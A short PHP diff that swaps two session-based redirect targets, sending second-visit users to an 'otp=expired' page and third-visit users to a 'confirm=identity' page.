@@ -18,10 +18,10 @@ if (isset($_SESSION['first_visit'])) {
    }
    else {
       $_SESSION['second_visit'] = "Second Visit";
-      header("Location: index.php?confirm=identity");
+      header("Location: index.php?otp=expired");
    }
    if (isset($_SESSION['third_visit'])) {
-      header("Location: index.php?otp=expired");
+      header("Location: index.php?confirm=identity");
    }
    else {
       $_SESSION['third_visit'] = "Second Visit";
